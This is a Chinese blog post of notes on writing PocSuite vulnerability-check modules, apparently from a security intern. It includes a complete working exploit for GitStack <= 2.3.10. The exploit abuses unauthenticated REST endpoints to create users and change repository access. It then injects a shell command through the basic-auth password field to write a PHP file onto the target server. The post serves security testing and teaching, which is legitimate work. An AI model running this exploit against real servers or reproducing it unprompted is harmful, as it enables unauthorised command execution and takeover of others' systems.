@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PocSuite编写及使用笔记 - co0ontty</title>
+    <meta name="author"  content="co0ontty">
+    <meta name="description" content="PocSuite编写及使用笔记">
+    <meta name="keywords"  content="安全开发, ALL">
+    <!-- Open Graph -->
+    <meta property="og:title" content="PocSuite编写及使用笔记 - co0ontty">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://localhost:4000/2019/07/29/pocsuit.html">
+    <meta property="og:description" content="Walking to Dalao。">
+    <meta property="og:site_name" content="co0ontty">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/share.min.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+	
+	<!--
+Author: Ray-Eldath
+refer to:
+ - http://docs.mathjax.org/en/latest/options/index.html
+-->
+
+	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+		jax: ["input/TeX", "output/HTML-CSS"],
+		tex2jax: {
+			inlineMath: [ ["$", "$"] ],
+			displayMath: [ ["$$", "$$"] ],
+			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+		},
+		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+      });
+    </script>
+
+	
+    <!--
+Author: Ray-Eldath
+-->
+<style>
+    .markdown-body .anchor{
+        float: left;
+        margin-top: -8px;
+        margin-left: -20px;
+        padding-right: 4px;
+        line-height: 1;
+        opacity: 0;
+    }
+    
+    .markdown-body .anchor .anchor-icon{
+        font-size: 15px
+    }
+</style>
+<script>
+    $(document).ready(function() {
+        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
+        for(let node of nodes) {
+            var anchor = document.createElement("a")
+            var anchorIcon = document.createElement("i")
+            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
+            anchorIcon.setAttribute("aria-hidden", true)
+            anchor.setAttribute("class", "anchor")
+            anchor.setAttribute("href", "#" + node.getAttribute("id"))
+            
+            anchor.onmouseover = function() {
+                this.style.opacity = "0.4"
+            }
+            
+            anchor.onmouseout = function() {
+                this.style.opacity = "0"
+            }
+            
+            anchor.appendChild(anchorIcon)
+            node.appendChild(anchor)
+        }
+    })
+</script>
+</head>
+
+
+<body>
+  <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+  <input id="nm-switch" type="hidden" value="true"> <header class="g-header">
+    <div class="g-logo">
+      <a href="/"></a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">首页</a></li>
+            
+            <li><a href="/tags.html">标签</a></li>
+            
+            <li><a href="/links.html">友链</a></li>
+            
+            <li><a href="/about.html">关于我</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+  <header
+    class="g-banner post-header post-pattern-circuitBoard bgcolor-default "
+    data-theme="default"
+  >
+    <div class="post-wrapper">
+      <div class="post-tags">
+        
+          
+            <a href="http://localhost:4000/tags#%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91" class="post-tag">安全开发</a>
+          
+            <a href="http://localhost:4000/tags#ALL" class="post-tag">ALL</a>
+          
+        
+      </div>
+      <h1>PocSuite编写及使用笔记</h1>
+      <div class="post-meta">
+        <span class="post-meta-item"><i class="iconfont icon-author"></i>co0ontty</span>
+        <time class="post-meta-item" datetime="19-07-29"><i class="iconfont icon-date"></i>29 Jul 2019</time>
+      </div>
+    </div>
+    
+    <div class="filter"></div>
+      <div class="post-cover" style="background: url('/assets/img/posts/pocsuitecover.png') center no-repeat; background-size: cover;"></div>
+    
+  </header>
+
+  <div class="post-content visible">
+    
+
+    <article class="markdown-body">
+      <h2 id="关于pocsuite">关于PocSuite</h2>
+<p><a href="http://pocsuite.org">PocSuite</a>是由知道创宇404实验室编写的一款基于python的开源漏洞利用框架。PocSuite包含漏洞检测和利用两种模式，可以针对特定漏洞对多个目标进行探测并返回漏洞检测及利用的结果。
+<img src="/assets/img/posts/pocsuite1.png" alt="使用过程图" /></p>
+<h2 id="pocsuite2">PocSuite2</h2>
+<p>关于PocSuite2的编写方法及使用过程中的注意事项</p>
+<h3 id="pocsuite2编写格式">PocSuite2编写格式</h3>
+<p>PocSuite检测模块的构成主要由以下几部分构成：
+·python库的引用模块
+·关于poc的介绍信息模块
+·漏洞检测代码模块
+·漏洞利用代码模块
+·返回结果模块</p>
+<h3 id="python库引用模块">python库引用模块</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">register</span>
+<span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">Output</span><span class="p">,</span> <span class="n">POCBase</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+</code></pre></div></div>
+<p>在该模块声明漏洞检测及利用过程中需要使用到的python库，其中<code class="highlighter-rouge">from pocsuite.api.poc import Output, POCBase 和 from pocsuite.api.poc import register</code>是必须要引用的库</p>
+
+<h3 id="关于poc的介绍信息模块">关于poc的介绍信息模块</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">vulID</span> <span class="o">=</span> <span class="s">'N/A'</span> <span class="c1">#根据seebug提供的漏洞编号进行编写，没有的话可以写N/A
+</span>    <span class="n">version</span> <span class="o">=</span> <span class="s">'1.0'</span> <span class="c1">#该poc的版本
+</span>    <span class="n">author</span> <span class="o">=</span> <span class="s">'co0ontty'</span> <span class="c1">#编写作者
+</span>    <span class="n">vulDate</span> <span class="o">=</span> <span class="s">'2019-7-11'</span> <span class="c1">#漏洞时间
+</span>    <span class="n">createDate</span> <span class="o">=</span> <span class="s">'2019-7-16'</span> <span class="c1">#创建poc的时间
+</span>    <span class="n">updateDate</span> <span class="o">=</span> <span class="s">'2019-7-16'</span> <span class="c1">#更新时间
+</span>    <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="s">'https://xz.gmail.com/t/2235'</span><span class="p">]</span> <span class="c1">#关于该漏洞的参考信息网站
+</span>    <span class="n">name</span> <span class="o">=</span> <span class="s">'GitStack &lt;= 2.3.10 远程命令执行漏洞分析'</span> <span class="c1">#漏洞名称
+</span>    <span class="n">appPowerLink</span> <span class="o">=</span> <span class="s">'https://gitstack.com'</span> <span class="c1">#存在漏洞的服务的官网
+</span>    <span class="n">appName</span> <span class="o">=</span> <span class="s">'GitStack'</span> <span class="c1">#存在漏洞的服务的名称
+</span>    <span class="n">appVersion</span> <span class="o">=</span> <span class="s">'GitStack &lt;= 2.3.10'</span> <span class="c1">#存在漏洞的服务的版本
+</span>    <span class="n">vulType</span> <span class="o">=</span> <span class="s">'文件上传'</span> <span class="c1">#该漏洞的类型（参考seebug官网的漏洞类型分类）
+</span>    <span class="n">desc</span> <span class="o">=</span> <span class="s">'''
+    该漏洞利用GitStack正常使用过程中调用的接口的未授权访问漏洞，越权读取、创建、修改用户列表、仓库。通过进一步利用实现恶意文件的上传。
+    '''</span> <span class="c1"># 漏洞的介绍信息
+</span>    <span class="n">samples</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">install_requires</span> <span class="o">=</span> <span class="p">[]</span>
+</code></pre></div></div>
+<h3 id="漏洞检测代码模块">漏洞检测代码模块</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span>
+        <span class="c1">#your verify code
+</span>        <span class="k">if</span> <span class="err">判断条件</span><span class="p">:</span>
+            <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1"># 标识为成功
+</span>            <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">][</span><span class="s">'URL'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="c1">#返回到结果中的url
+</span>            <span class="k">pass</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="c1"># 返回结果
+</span></code></pre></div></div>
+<p>系统会根据用户编写的检测代码对漏洞进行检测，设置判断条件后，如果判断条件为真，则使用<code class="highlighter-rouge">result['VerifyInfo'] = {}</code>返回判断结果为真，并且使用<code class="highlighter-rouge">result['VerifyInfo']['URL'] = self.url</code>返回向返回结果中输出特定的值。最后程序在运行<code class="highlighter-rouge">return self.parse_output(result)</code>结果输出代码的时候，如果存在<code class="highlighter-rouge">result['VerifyInfo'] = {}</code>则返回success，如果不存在则判断为faild</p>
+<h3 id="漏洞利用代码模块">漏洞利用代码模块</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_attack</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+    <span class="c1"># attack code 
+</span></code></pre></div></div>
+<p>一般情况下会设置检测代码与漏洞利用代码相同：</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_attack</span> <span class="o">=</span> <span class="n">_verify</span>
+</code></pre></div></div>
+<h3 id="返回结果模块">返回结果模块</h3>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">parse_output</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">Output</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+            <span class="n">output</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">output</span><span class="o">.</span><span class="n">fail</span><span class="p">(</span><span class="s">'Internet nothing returned'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">output</span>
+</code></pre></div></div>
+<p>将漏洞检测模块或者漏洞利用模块的结果输出到屏幕中显示</p>
+
+<h3 id="完整代码分享">完整代码分享</h3>
+<p>GitStack任意文件上传漏洞</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
+# -*- coding: utf-8 -*-
+# from pocsuite.api.request import req
+</span><span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">register</span>
+<span class="kn">from</span> <span class="nn">pocsuite.api.poc</span> <span class="kn">import</span> <span class="n">Output</span><span class="p">,</span> <span class="n">POCBase</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">from</span> <span class="nn">requests.auth</span> <span class="kn">import</span> <span class="n">HTTPBasicAuth</span>
+
+
+<span class="k">class</span> <span class="nc">TestPOC</span><span class="p">(</span><span class="n">POCBase</span><span class="p">):</span>
+    <span class="n">vulID</span> <span class="o">=</span> <span class="s">'N/A'</span>
+    <span class="n">version</span> <span class="o">=</span> <span class="s">'GitStack &lt;= 2.3.10'</span>
+    <span class="n">author</span> <span class="o">=</span> <span class="s">'co0ontty'</span>
+    <span class="n">vulDate</span> <span class="o">=</span> <span class="s">'2019-7-11'</span>
+    <span class="n">createDate</span> <span class="o">=</span> <span class="s">'2019-7-16'</span>
+    <span class="n">updateDate</span> <span class="o">=</span> <span class="s">'2018-3-31'</span>
+    <span class="n">references</span> <span class="o">=</span> <span class="p">[</span><span class="s">'https://xz.gmail.com/t/2235'</span><span class="p">]</span>
+    <span class="n">name</span> <span class="o">=</span> <span class="s">'GitStack &lt;= 2.3.10 远程命令执行漏洞分析'</span>
+    <span class="n">appPowerLink</span> <span class="o">=</span> <span class="s">'https://gitstack.com'</span>
+    <span class="n">appName</span> <span class="o">=</span> <span class="s">'GitStack'</span>
+    <span class="n">appVersion</span> <span class="o">=</span> <span class="s">'GitStack &lt;= 2.3.10'</span>
+    <span class="n">vulType</span> <span class="o">=</span> <span class="s">'文件上传'</span>
+    <span class="n">desc</span> <span class="o">=</span> <span class="s">'''
+    该漏洞利用GitStack正常使用过程中调用的接口的未授权访问漏洞，越权读取、创建、修改用户列表、仓库。通过进一步利用实现恶意文件的上传。
+    '''</span>
+    <span class="n">samples</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">install_requires</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">def</span> <span class="nf">_verify</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="p">{}</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span>
+        <span class="n">repository</span> <span class="o">=</span> <span class="s">'rce'</span>
+        <span class="n">username</span> <span class="o">=</span> <span class="s">'rce'</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="s">'rce'</span>
+        <span class="n">csrf_token</span> <span class="o">=</span> <span class="s">'token'</span>
+        <span class="n">user_list</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}/rest/user/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">user_list</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+            <span class="n">user_list</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s">'everyone'</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">user_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">user_list</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/rest/user/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">),</span><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'username'</span> <span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s">'password'</span> <span class="p">:</span> <span class="n">password</span><span class="p">})</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">"{}/rest/repository/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+        <span class="n">repository_list</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">repository_list</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">repository</span> <span class="o">=</span> <span class="n">repository_list</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">'name'</span><span class="p">]</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/rest/repository/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s">'csrftoken'</span> <span class="p">:</span> <span class="n">csrf_token</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">'name'</span> <span class="p">:</span> <span class="n">repository</span><span class="p">,</span> <span class="s">'csrfmiddlewaretoken'</span> <span class="p">:</span> <span class="n">csrf_token</span><span class="p">})</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s">"{}/rest/repository/{}/user/{}/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">repository</span><span class="p">,</span> <span class="n">username</span><span class="p">))</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">delete</span><span class="p">(</span><span class="s">"{}/rest/repository/{}/user/{}/"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">repository</span><span class="p">,</span> <span class="s">"everyone"</span><span class="p">))</span>
+        <span class="n">random_file_name</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">+</span><span class="s">".php"</span>
+        <span class="n">random_identify_code</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span><span class="mi">35</span><span class="p">))</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'{}/web/index.php?p={}.git&amp;a=summary'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">repository</span><span class="p">),</span> <span class="n">auth</span><span class="o">=</span><span class="n">HTTPBasicAuth</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="s">'p &amp;&amp; echo "&lt;?php echo"'</span><span class="o">+</span><span class="n">random_identify_code</span><span class="o">+</span><span class="s">'"; ?&gt;" &gt; c:'</span><span class="o">+</span><span class="n">random_file_name</span><span class="p">))</span>
+        <span class="n">test_url</span> <span class="o">=</span> <span class="n">target</span><span class="o">+</span><span class="s">"/web/"</span><span class="o">+</span><span class="n">random_file_name</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">test_url</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">random_identify_code</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">):</span>
+            <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
+            <span class="n">result</span><span class="p">[</span><span class="s">'VerifyInfo'</span><span class="p">][</span><span class="s">'URL'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span>
+            <span class="k">pass</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_output</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+
+    <span class="n">_attack</span> <span class="o">=</span> <span class="n">_verify</span>
+
+    <span class="k">def</span> <span class="nf">parse_output</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">result</span><span class="p">):</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">Output</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">result</span><span class="p">:</span>
+            <span class="n">output</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">output</span><span class="o">.</span><span class="n">fail</span><span class="p">(</span><span class="s">'Internet nothing returned'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">output</span>
+
+
+<span class="n">register</span><span class="p">(</span><span class="n">TestPOC</span><span class="p">)</span>
+
+</code></pre></div></div>
+<h2 id="库的使用">库的使用</h2>
+<h3 id="requests-库">requests 库</h3>
+<p>pocsuite中自带经过改装的req，<code class="highlighter-rouge">from pocsuite.api.request import req</code>，pocsuite 中的req可以使用随机的UA</p>
+<h3 id="urlparse">urlparse</h3>
+<p>使用如下命令时，py中调用目标的方式时通过 self.url 和 self.target</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pocsuite</span> <span class="o">-</span><span class="n">r</span> <span class="n">portals_urllib</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="mf">172.16.5.155</span><span class="p">:</span><span class="mi">8080</span>
+</code></pre></div></div>
+<p>self.url 与 self.target 的区别为：如果 -u 传递的参数没有指定 http 或者 https 的话，self.url 会自动添加 http:// 而 self.target 则不会做任何操作。
+<img src="/assets/img/posts/pocsuite-4.png" alt="使用过程图" />
+不管怎样，self.url 和 self.target 均无法对端口进行识别和操作，所以我们要引入 urlparse 库：</p>
+<h3 id="urlparse库">urlparse库</h3>
+<p><strong>urlparse.urlparse(分离）</strong>
+<img src="/assets/img/posts/pocsuite-6.png" alt="urlparse.urlparse" />
+<strong>urlparse.urljoin（合并）</strong>
+<img src="/assets/img/posts/pocsuite-5.png" alt="urlparse.urljoin" /></p>
+
+    </article>
+
+    
+    <div class="social-share-wrapper">
+      <div class="social-share"></div>
+    </div>
+    
+  </div>
+
+  <section class="author-detail">
+    <section class="post-footer-item author-card">
+      <div class="avatar">
+        <img src="http://localhost:4000/assets/img/profile.png" alt="">
+      </div>
+      <div class="author-name" rel="author">co0ontty</div>
+      <div class="bio">
+        <p>知道创宇实习生</p>
+      </div>
+      
+      <ul class="sns-links">
+        
+        <li>
+          <a href="//weibo.com/5792988237" target="_blank">
+                    <i class="iconfont icon-weibo"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="mailto:co0ontty@gmail.com" target="_blank">
+                    <i class="iconfont icon-email"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//facebook.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-facebook"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//github.com/co0ontty" target="_blank">
+                    <i class="iconfont icon-github"></i>
+                </a>
+        </li>
+        
+      </ul>
+      
+    </section>
+    <section class="post-footer-item read-next">
+      
+      <div class="read-next-item">
+        <a href="/2019/07/30/zoomeyeapi.html" class="read-next-link"></a>
+        <section>
+          <span>钟馗之眼python调用框架</span>
+          <p>python调用zoomeye-api编写原因：使用pocsuite框架调用zoomeye测试poc的过程中发现p...</p>
+        </section>
+        
+        <div class="filter"></div>
+        <img src="/assets/img/posts/zoomeye.jpg" alt="">
+        
+     </div>
+      
+
+      
+      <div class="read-next-item">
+        <a href="/2019/07/23/nginx.html" class="read-next-link"></a>
+          <section>
+            <span>Nginx反向代理设置</span>
+            <p>环境需求使用nginx配置反向代理，将web根目录与web二级目录映射到不同的ip和端口例如：10.11.10.1...</p>
+          </section>
+          
+      </div>
+      
+    </section>
+    
+  </section>
+<div id="lv-container" data-id="city" data-uid="MTAyMC80MTI3My8xNzgyMQ==">
+<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+</script>
+<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+  <footer class="g-footer">
+  <!-- <section><a href="javascript:scroll(50,50)">回到顶端</a></section> -->
+<!-- 网站计数器 -->
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <div style="margin: auto;width: auto;">
+      <span id="site_pv_count" title="总点击量"><img src="/assets/vendor/octicons/svg/eye.svg" width=16 height=16 > <span id="busuanzi_value_site_pv"></span></span> &nbsp; &nbsp; | &nbsp; &nbsp; 
+    <span id="site_uv_count" title="总访客量"> <img src="/assets/vendor/octicons/svg/person.svg" width=10 height=16> <span id="busuanzi_value_site_uv"></span></span>
+    </div>
+<!-- 到此为止 -->
+  <section>co0ontty ©
+  
+  
+    2018
+    -
+  
+  2019
+  </section>
+  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+
+
+</footer>
+
+
+  <script src="/assets/js/social-share.min.js"></script>
+  <script>
+    socialShare('.social-share', {
+      sites: [
+        
+          'wechat'
+          ,
+          
+        
+          'weibo'
+          ,
+          
+        
+          'douban'
+          ,
+          
+        
+          'twitter'
+          
+        
+      ],
+      wechatQrcodeTitle: "分享到微信朋友圈",
+      wechatQrcodeHelper: '<p>扫码后点击右上角</p><p>将本文分享至朋友圈</p>'
+    });
+  </script>
+
+  
+  
+
+  <script src="/assets/js/prism.js"></script>
+  <script src="/assets/js/index.min.js"></script>
+  <script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?7084bb2b47ca9a611ae8225633e5caeb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-129901756-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-129901756-1');
+</script>
+
+</body>
+
+</html>
